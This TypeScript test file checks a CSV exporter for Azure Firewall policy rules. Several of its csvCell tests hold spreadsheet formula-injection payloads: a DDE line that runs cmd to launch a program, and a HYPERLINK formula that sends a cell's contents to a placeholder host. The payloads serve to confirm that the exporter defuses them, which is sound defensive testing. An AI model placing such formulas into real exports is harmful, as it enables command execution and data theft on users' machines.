import { describe, expect, it } from 'vitest';
import { csvCell, csvFileName, groupsToCsv } from './csv';
import type { RuleCollectionGroup } from './types';

const IPG =
  '/subscriptions/s/resourceGroups/rg/providers/Microsoft.Network/ipGroups/ipg-spokes';

const group: RuleCollectionGroup = {
  id: 'x/ruleCollectionGroups/rcg-platform',
  name: 'rcg-platform',
  priority: 200,
  ruleCollections: [
    {
      ruleCollectionType: 'FirewallPolicyFilterRuleCollection',
      name: 'app-allow',
      priority: 200,
      action: { type: 'Allow' },
      rules: [
        {
          ruleType: 'ApplicationRule',
          name: 'ms',
          protocols: [{ protocolType: 'Https', port: 443 }],
          sourceAddresses: ['10.0.0.0/8'],
          targetFqdns: ['*.microsoft.com', 'login.microsoftonline.com'],
        },
      ],
    },
    {
      ruleCollectionType: 'FirewallPolicyFilterRuleCollection',
      name: 'net-allow-core',
      priority: 100,
      action: { type: 'Allow' },
      rules: [
        {
          ruleType: 'NetworkRule',
          name: 'dns',
          description: 'DNS, "internal"',
          ipProtocols: ['UDP', 'TCP'],
          sourceIpGroups: [IPG],
          destinationAddresses: ['10.0.10.4'],
          destinationPorts: ['53'],
        },
      ],
    },
    {
      ruleCollectionType: 'FirewallPolicyFilterRuleCollection',
      name: 'empty',
      priority: 300,
      action: { type: 'Deny' },
      rules: [],
    },
  ],
};

const parse = (csv: string) =>
  csv
    .replace(/^\uFEFF/, '')
    .trim()
    .split('\r\n');

describe('groupsToCsv', () => {
  it('writes one row per rule in collection priority order, plus empty collections', () => {
    const lines = parse(
      groupsToCsv([{ group, policyName: 'fp-hub-eus', drafted: true }]),
    );
    expect(
      lines[0].startsWith('Policy,Inherited from,Rule collection group'),
    ).toBe(true);
    expect(lines).toHaveLength(4);
    expect(lines[1]).toContain('net-allow-core,100,Network,Allow,dns,Network');
    // Quotes and commas are escaped; IP Group IDs are shortened to names.
    expect(lines[1]).toContain('"DNS, ""internal"""');
    expect(lines[1]).toContain('ipg-spokes,UDP; TCP,53,10.0.10.4');
    expect(lines[2]).toContain('*.microsoft.com; login.microsoftonline.com');
    expect(lines[2]).toContain('Https:443');
    expect(lines[3]).toContain('empty,300,Network,Deny');
    expect(lines[1].endsWith(',Yes')).toBe(true);
  });

  it('starts with a byte-order mark so Excel reads UTF-8', () => {
    expect(groupsToCsv([]).charCodeAt(0)).toBe(0xfeff);
  });
});

describe('csvCell', () => {
  it('defuses spreadsheet formulas but keeps negative numbers and ranges', () => {
    expect(csvCell('=HYPERLINK("x")')).toBe(`"'=HYPERLINK(""x"")"`);
    expect(csvCell('@SUM(A1)')).toBe("'@SUM(A1)");
    expect(csvCell('-5')).toBe('-5');
    expect(csvCell('1-65535')).toBe('1-65535');
    expect(csvCell('-2.5')).toBe('-2.5');
    expect(csvCell(42)).toBe('42');
  });

  it('defuses formulas that start with a negative number', () => {
    expect(csvCell('-1+HYPERLINK("https://x/?"&A2,"x")')).toBe(
      `"'-1+HYPERLINK(""https://x/?""&A2,""x"")"`,
    );
    expect(csvCell("-1+cmd|' /C calc'!A0")).toBe("'-1+cmd|' /C calc'!A0");
    expect(csvCell('+1')).toBe("'+1");
  });

  it('defuses formulas behind leading whitespace or line breaks', () => {
    expect(csvCell('\n=1+1')).toBe(`"'\n=1+1"`);
    expect(csvCell('\t=1+1')).toBe("'\t=1+1");
    expect(csvCell('\r\n@SUM(A1)')).toBe(`"'\r\n@SUM(A1)"`);
    expect(csvCell('  =1+1')).toBe("'  =1+1");
  });

  it('leaves ordinary text alone', () => {
    expect(csvCell('Allow DNS')).toBe('Allow DNS');
    expect(csvCell('')).toBe('');
    expect(csvCell(undefined)).toBe('');
  });
});

describe('csvFileName', () => {
  it('makes a safe, dated file name', () => {
    expect(csvFileName('fp hub/eus', 'rcg:platform')).toMatch(
      /^fp-hub-eus_rcg-platform_\d{4}-\d{2}-\d{2}\.csv$/,
    );
  });
});
